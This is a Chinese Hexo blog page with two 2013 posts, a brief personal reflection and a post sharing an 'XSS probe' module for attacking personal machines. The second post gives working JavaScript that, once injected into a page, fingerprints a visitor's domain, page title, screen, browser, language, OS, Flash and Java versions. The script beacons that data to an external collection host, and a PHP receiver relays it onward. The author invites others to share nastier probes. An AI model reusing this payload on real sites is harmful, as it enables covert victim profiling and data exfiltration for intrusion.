    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/09/07/写在2013-9-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/09/07/写在2013-9-7/" itemprop="url">写在2013/9/7</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-09-07T15:58:09+08:00">
                2013-09-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/琐碎杂事/" itemprop="url" rel="index">
                    <span itemprop="name">琐碎杂事</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp;刚看道哥博客，看见一篇文章<a href="http://taosay.net/?p=705" target="_blank" rel="noopener">http://taosay.net/?p=705</a>，《你尽力了吗？》。</p>
<p>看完这篇博文，颇有感触。同个技术点，多篇文章，很多时候我们都放过了90%，只看了10%，最后我们却错过了50%。</p>
<p>记得看过道哥关于《hacking&nbsp;for fun》的演讲，感觉比较符合自己最初的感觉，而和黑哥聊到《hacking for fun》的时候说，道哥忽悠了一大片孩子。</p>
<p>在和前辈的一些聊天中，我说工作了就没有了现在“玩”技术的感觉，感觉不一样了，有的前辈赞同，有点前辈不认同。</p>
<p>&nbsp;</p>
<p>&nbsp; &nbsp; 有句话这么说来着，“<span style="font-family:arial;font-size:13px;line-height:20px;">一千个读者就有</span><span style="color:#000000;font-family:arial;font-size:13px;line-height:20px;">一千个哈姆雷特”。</span></p>
<p><span style="color:#000000;font-family:arial;font-size:13px;line-height:20px;">&nbsp; &nbsp; 有时候坚持自己的本心还是非常有必要的，最原始的目的才是最真实的目的。</span></p>
<p></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/09/04/XSS-Platform-xss探针模块/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/09/04/XSS-Platform-xss探针模块/" itemprop="url">[XSS Platform] xss探针模块</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-09-04T19:01:34+08:00">
                2013-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HTML-CSS-JS-xss-xml/" itemprop="url" rel="index">
                    <span itemprop="name">HTML|CSS|JS|xss|xml</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <div class="t_msgfontfix" style="word-wrap:break-word;line-height:normal;min-height:100px;color:#444444;font-family:Verdana, Helvetica, Arial, sans-serif;"><table cellspacing="0" cellpadding="0" style="word-wrap:break-word;empty-cells:show;width:1337px;table-layout:fixed;margin-left:1px;" class="ke-zeroborder"><tbody style="word-wrap:break-word;"><tr style="word-wrap:break-word;"><td class="t_msgfont" id="postmessage_77510" style="word-wrap:break-word;color:#444444;font-size:14px;line-height:1.6em;font-family:Verdana, Helvetica, Arial, sans-serif;">一个完善强大的xss探针对渗透个人机至关重要，怎么才算一个比较完善强大的xss探针呢？<br><br>首先，兼容性好，兼容主流浏览器（ie、chrome、firefox、safari）。<br><br>其次，具备以下功能：<br><br>实现功能:<br><br><em>   domain
</em>   screen&nbsp;&nbsp;//初步判断台式机还是笔记本<br><em>   browser_name
</em>   browser_version<br><em>   language
</em>   Osystem<br><em>   flash_version
</em>   java_version<br><span style="word-wrap:break-word;line-height:normal;font-family:’Helvetica Neue, Arial, Helvetica, sans-serif ’;"><span style="word-wrap:break-word;color:#222222;"><span style="word-wrap:break-word;font-size:12px;">没有实现功能：</span></span></span><br><br><em>   antivirus
</em>   browser_expand<br>*   pc_software<br><br>希望各位大牛共享下你们自己的高端大气上档次的代码，没有最猥琐，只有更猥琐<br><br>我先共享下我个人胡乱写的一<span style="word-wrap:break-word;line-height:normal;font-size:12px;">个xss platform 探针模块</span><br><br><span style="word-wrap:break-word;line-height:normal;font-size:12px;">代码1：</span><br><br><span style="word-wrap:break-word;line-height:normal;font-size:12px;"><a href="http://lanu-upload.stor.sinaapp.com/201309/3b1d12c0be6401c70c08429aa8f8766f201309041913472035883472.jpg" target="_blank" rel="noopener"><img src="http://lanu-upload.stor.sinaapp.com/201309/3b1d12c0be6401c70c08429aa8f8766f201309041913472035883472.jpg" alt="点击查看原图"></a>&nbsp;<br><br></span><br><br><div class="blockcode" style="word-wrap:break-word;line-height:normal;margin:10px 0px;padding:10px 0px 5px 10px;width:586px;border:1px solid #cccccc;background-image:url(https://forum.90sec.org/images/default/codebg.gif);background-color:#f7f7f7;overflow:hidden;background-position:0px 0px;background-repeat:no-repeat repeat;"><div id="code0" style="word-wrap:break-word;"><br><br>1.  var info = {};var deployJava=function(){function g(n){if(!d.debug){return}if(console.log){console.log(n)}else{alert(n)}}var d={debug:null,version:”20120801”,firefoxJavaVersion:null,oldMimeType:”application/npruntime-scriptable-plugin;DeploymentToolkit”,mimeType:”application/java-deployment-toolkit”,browserName:null,browserName2:null,getJREs:function(){var r=new Array();if(this.isPluginInstalled()){var q=this.getPlugin();var n=q.jvms;for(var p=0;p&lt;n.getLength();p++){r[p]=n.get(p).version}}else{var o=this.getBrowser();if(o==”MSIE”){if(this.testUsingActiveX(“1.7.0”)){r[0]=”1.7.0”}else{if(this.testUsingActiveX(“1.6.0”)){r[0]=”1.6.0”}else{if(this.testUsingActiveX(“1.5.0”)){r[0]=”1.5.0”}else{if(this.testUsingActiveX(“1.4.2”)){r[0]=”1.4.2”}else{if(this.testForMSVM()){r[0]=”1.1”}}}}}}else{if(o==”Netscape Family”){this.getJPIVersionUsingMimeType();if(this.firefoxJavaVersion!=null){r[0]=this.firefoxJavaVersion}else{if(this.testUsingMimeTypes(“1.7”)){r[0]=”1.7.0”}else{if(this.testUsingMimeTypes(“1.6”)){r[0]=”1.6.0”}else{if(this.testUsingMimeTypes(“1.5”)){r[0]=”1.5.0”}else{if(this.testUsingMimeTypes(“1.4.2”)){r[0]=”1.4.2”}else{if(this.browserName2==”Safari”){if(this.testUsingPluginsArray(“1.7.0”)){r[0]=”1.7.0”}else{if(this.testUsingPluginsArray(“1.6”)){r[0]=”1.6.0”}else{if(this.testUsingPluginsArray(“1.5”)){r[0]=”1.5.0”}else{if(this.testUsingPluginsArray(“1.4.2”)){r[0]=”1.4.2”}}}}}}}}}}}}}if(this.debug){for(var p=0;p&lt;r.length;++p){g(“[getJREs()] We claim to have detected Java SE “+r[p])}}return r},getJPIVersionUsingMimeType:function(){for(var o=0;o&lt;navigator.mimeTypes.length;++o){var p=navigator.mimeTypes[o].type;var n=p.match(/^application/x-java-applet;jpi-version=(.&amp;#42)$/);if(n!=null){this.firefoxJavaVersion=n[1];if(“Opera”!=this.browserName2){break}}}},isPluginInstalled:function(){var n=this.getPlugin();if(n&amp;&amp;n.jvms){return true}else{return false}},allowPlugin:function(){this.getBrowser();var n=(“Safari”!=this.browserName2&amp;&amp;”Opera”!=this.browserName2);return n},getPlugin:function(){this.refresh();var n=null;if(this.allowPlugin()){n=document.getElementById(“deployJavaPlugin”)}return n},compareVersionToPattern:function(u,o,q,r){if(u==undefined||o==undefined){return false}var v=”^(\d+)(?:.(\d+)(?:.(\d+)(?:_(\d+))?)?)?[&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;DISCUZ_CODE_0&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;]quot;;var w=u.match(v);if(w!=null){var t=0;var x=new Array();for(var p=1;p&lt;w.length;++p){if((typeof w[p]==”string”)&amp;&amp;(w[p]!=””)){x[t]=w[p];t++}}var n=Math.min(x.length,o.length);if(r){for(var p=0;p&lt;n;++p){if(x[p]&lt;o[p]){return false}else{if(x[p]&gt;o[p]){return true}}}return true}else{for(var p=0;p&lt;n;++p){if(x[p]!=o[p]){return false}}if(q){return true}else{return(x.length==o.length)}}}else{return false}},getBrowser:function(){if(this.browserName==null){var n=navigator.userAgent.toLowerCase();g(“[getBrowser()] navigator.userAgent.toLowerCase() -&gt; “+n);if((n.indexOf(“msie”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”MSIE”;this.browserName2=”MSIE”}else{if(n.indexOf(“iphone”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”iPhone”}else{if((n.indexOf(“firefox”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”Netscape Family”;this.browserName2=”Firefox”}else{if(n.indexOf(“chrome”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Chrome”}else{if(n.indexOf(“safari”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Safari”}else{if((n.indexOf(“mozilla”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”Netscape Family”;this.browserName2=”Other”}else{if(n.indexOf(“opera”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Opera”}else{this.browserName=”?”;this.browserName2=”unknown”}}}}}}}g(“[getBrowser()] Detected browser name:”+this.browserName+”, “+this.browserName2)}return this.browserName},testUsingActiveX:function(n){var p=”JavaWebStart.isInstalled.”+n+”.0”;if(typeof ActiveXObject==”undefined”||!ActiveXObject){g(“[testUsingActiveX()] Browser claims to be IE, but no ActiveXObject object?”);return false}try{return(new ActiveXObject(p)!=null)}catch(o){return false}},testForMSVM:function(){var o=”{08B0E5C0-4FCB-11CF-AAA5-00401C608500}”;if(typeof oClientCaps!=”undefined”){var n=oClientCaps.getComponentVersion(o,”ComponentID”);if((n==””)||(n==”5,0,5000,0”)){return false}else{return true}}else{return false}},testUsingMimeTypes:function(o){if(!navigator.mimeTypes){g(“[testUsingMimeTypes()] Browser claims to be Netscape family, but no mimeTypes[] array?”);return false}for(var p=0;p&lt;navigator.mimeTypes.length;++p){s=navigator.mimeTypes[p].type;var n=s.match(/^application/x-java-appletx3Bversion=(1.8|1.7|1.6|1.5|1.4.2)$/);if(n!=null){if(this.compareVersions(n[1],o)){return true}}}return false},testUsingPluginsArray:function(o){if((!navigator.plugins)||(!navigator.plugins.length)){return false}var n=navigator.platform.toLowerCase();for(var p=0;p&lt;navigator.plugins.length;++p){s=navigator.plugins[p].description;if(s.search(/^Java Switchable Plug-in (Cocoa)/)!=-1){if(this.compareVersions(“1.5.0”,o)){return true}}else{if(s.search(/^Java/)!=-1){if(n.indexOf(“win”)!=-1){if(this.compareVersions(“1.5.0”,o)||this.compareVersions(“1.6.0”,o)){return true}}}}}if(this.compareVersions(“1.5.0”,o)){return true}return false},compareVersions:function(q,r){var o=q.split(“.”);var n=r.split(“.”);for(var p=0;p&lt;o.length;++p){o[p]=Number(o[p])}for(var p=0;p&lt;n.length;++p){n[p]=Number(n[p])}if(o.length==2){o[2]=0}if(o[0]&gt;n[0]){return true}if(o[0]&lt;n[0]){return false}if(o[1]&gt;n[1]){return true}if(o[1]&lt;n[1]){return false}if(o[2]&gt;n[2]){return true}if(o[2]&lt;n[2]){return false}return true},refresh:function(){navigator.plugins.refresh(false);var n=this.getBrowser();if(n==”Netscape Family”&amp;&amp;this.allowPlugin()){var o=document.getElementById(“deployJavaPlugin”);if(o==null){this.writeEmbedTag()}}},writeEmbedTag:function(){var n=false;if(navigator.mimeTypes!=null){for(var o=0;o&lt;navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.mimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write(’&lt;embed id=”deployJavaPlugin” type=”’+this.mimeType+’” hidden=”true” /&gt;’);n=true}}}if(!n){for(var o=0;o&lt;navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.oldMimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write(’&lt;embed id=”deployJavaPlugin” type=”’+this.oldMimeType+’” hidden=”true” /&gt;’)}}}}}}};return d}();<br><br>2.  //网站域名info.domain = document.domain;/&amp;#42//网页标题info.title = document.title;&amp;#42///屏幕分辨率info.screen = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var c = “”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (self.screen) {c = screen.width+”x”+screen.height;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return c;}();<br><br>3.  //浏览器和版本info.browser = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var Sys = {};&nbsp; &nbsp; var ua = navigator.userAgent.toLowerCase();&nbsp; &nbsp; var s;&nbsp; &nbsp; (s = ua.match(/msie ([d.]+)/)) ? Sys.ie = s[1] :&nbsp; &nbsp; (s = ua.match(/firefox/([d.]+)/)) ? Sys.firefox = s[1] :&nbsp; &nbsp; (s = ua.match(/chrome/([d.]+)/)) ? Sys.chrome = s[1] :&nbsp; &nbsp; (s = ua.match(/opera.([d.]+)/)) ? Sys.opera = s[1] :&nbsp; &nbsp; (s = ua.match(/version/([d.]+).&amp;#42safari/)) ? Sys.safari = s[1] : 0;&nbsp; &nbsp; if (Sys.ie) return {name: ’IE’&nbsp;&nbsp;|| “”, version: Sys.ie || “0”};&nbsp; &nbsp; if (Sys.firefox) return {name: ’Firefox’ || “”, version: Sys.firefox || “0”};&nbsp; &nbsp; if (Sys.chrome) return {name: ’Chrome’ || “”, version: Sys.chrome || “0”};&nbsp; &nbsp; if (Sys.opera) return {name: ’Opera’ || “”, version: Sys.opera || “0”};&nbsp; &nbsp; if (Sys.safari) return {name: ’Safari’ || “”, version: Sys.safari || “0”};}();<br><br>4.  //浏览器语言info.lang = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var type=navigator.appName&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (type==”Netscape”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; var lang = navigator.language;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; var lang = navigator.userLanguage;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return lang;}();<br><br>5.  //系统平台info.system = function (){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var appVer = navigator.userAgent;&nbsp; &nbsp; var _pf = navigator.platform;&nbsp; &nbsp;&nbsp; &nbsp;if(_pf == “Win32” || _pf == “Windows”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if(appVer.indexOf(“Windows NT 6.0”) &gt; -1&nbsp;&nbsp;|| appVer.indexOf(“Windows Vista”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows Vista’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(appVer.indexOf(“Windows NT 6.1”) &gt; -1 || appVer.indexOf(“Windows 7”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows 7’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }else if(appVer.indexOf(“Windows NT 6.2”) &gt; -1 || appVer.indexOf(“Windows 8”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return ’Windows 8’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;try{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;var _winName = Array(’2000’,’XP’,’2003’);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;var _ntNum = appVer.match(/Windows NT 5.d/i).toString();&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return ’Windows ’ + _winName[_ntNum.replace(/Windows NT 5.(d)/i,”$1”)];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}catch(e){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;}else if(_pf == “Mac68K” || _pf == “MacPPC” || _pf == “Macintosh”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Mac”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(_pf == “X11”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Unix”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(String(_pf).indexOf(“Linux”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Linux”;&nbsp; &nbsp;&nbsp; &nbsp; }else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Unknow”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}();&nbsp;&nbsp;<br><br>6.  //flash版本info.flash = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var f=””,n=navigator;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (n.plugins &amp;&amp; n.plugins.length) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; for (var ii=0;ii&lt;n.plugins.length;ii++) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if (n.plugins[ii].name.indexOf(’Shockwave Flash’)!=-1) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;f=n.plugins[ii].description.split(’Shockwave Flash ’)[1];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;break;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;else&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (window.ActiveXObject) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; for (var ii=10;ii&gt;=2;ii–) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;try {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var fl=eval(“new ActiveXObject(’ShockwaveFlash.ShockwaveFlash.”+ii+”’);”);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (fl) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; f=ii + ’.0’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; break;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; catch(e) {}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return f;}(); //java版本info.java = deployJava.getJREs();<br><br>7.  function json2str(o) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var arr = [];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var fmt = function(s) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if (typeof s == ’object’ &amp;&amp; s != null) return json2str(s);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return /^(string|number)$/.test(typeof s) ? “”” + s + “”” : s;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;for (var i in o) arr.push(“”” + i + “”:” + fmt(o[i]));&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’{’ + arr.join(’,’) + ’}’;}&nbsp;<br><br>8.  var i = json2str(info);x=new Image();x.src = “<a href="http://xssprobe.sinaapp.com/probe.php?id={projectId}&amp;c=&quot;+i;//自定义" target="_blank" rel="noopener">http://xssprobe.sinaapp.com/probe.php?id={projectId}&amp;c=&quot;+i;//自定义</a><br></div><br><span style="word-wrap:break-word;margin-left:43px;font-size:12px;cursor:pointer;color:#666666;">复制代码</span></div>

<p>设置参数：</p>
<p><a href="http://lanu-upload.stor.sinaapp.com/201309/e7c1f8d49689e645887525f4699ecebf201309041913461985046721.jpg" target="_blank" rel="noopener"><img src="http://lanu-upload.stor.sinaapp.com/201309/e7c1f8d49689e645887525f4699ecebf201309041913461985046721.jpg" alt="点击查看原图"></a>&nbsp;</p>
<p>代码2：根目录下新建文件<span style="word-wrap:break-word;line-height:normal;font-size:12px;">probe.php</span></p>
<div class="blockcode" style="word-wrap:break-word;line-height:normal;margin:10px 0px;padding:10px 0px 5px 10px;width:586px;border:1px solid #cccccc;background-image:url(https://forum.90sec.org/images/default/codebg.gif);background-color:#f7f7f7;overflow:hidden;background-position:0px 0px;background-repeat:no-repeat repeat;"><div id="code1" style="word-wrap:break-word;"><br><br>1.  &lt;?phpif (!empty($_GET[“c”])){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$data = quotes($_GET[“c”]);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$ar_data = json_decode(urldecode($data), true);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;header(“Location:<a href="http://xssprobe.sinaapp.com/index.php?do=api&amp;id={$_GET[id]}&amp;browser_name={$ar_data[browser][name]}&amp;browser_version={$ar_data[browser][version]}&amp;language={$ar_data[lang]}&amp;domain={$ar_data[domain]}&amp;screen={$ar_data[screen]}&amp;flash_version={$ar_data[flash]}&amp;Osystem={$ar_data[system]}&amp;java_version={$ar_data[java][0]}&quot;);}function" target="_blank" rel="noopener">http://xssprobe.sinaapp.com/index.php?do=api&amp;id={$_GET[id]}&amp;browser_name={$ar_data[browser][name]}&amp;browser_version={$ar_data[browser][version]}&amp;language={$ar_data[lang]}&amp;domain={$ar_data[domain]}&amp;screen={$ar_data[screen]}&amp;flash_version={$ar_data[flash]}&amp;Osystem={$ar_data[system]}&amp;java_version={$ar_data[java][0]}&quot;);}function</a> quotes($content){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if(get_magic_quotes_gpc()){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if(is_array($content)){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;foreach($content as $key=&gt;$value){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$content[$key] = stripslashes($value);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$content = stripslashes($content);}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else{}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return $content;}<br><br>2.  ?&gt;<br></div><br><span style="word-wrap:break-word;margin-left:43px;font-size:12px;cursor:pointer;color:#666666;">复制代码</span></div><br></td><br></tr><br></tbody><br></table><br></div><br><div id="post_rate_div_77510" style="word-wrap:break-word;line-height:normal;color:#444444;font-family:Verdana, Helvetica, Arial, sans-serif;"></div><br><div class="points" style="word-wrap:break-word;width:1337.484375px;margin:10px auto;text-align:center;overflow:hidden;clear:both;line-height:normal;color:#444444;font-family:Verdana, Helvetica, Arial, sans-serif;"></div>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
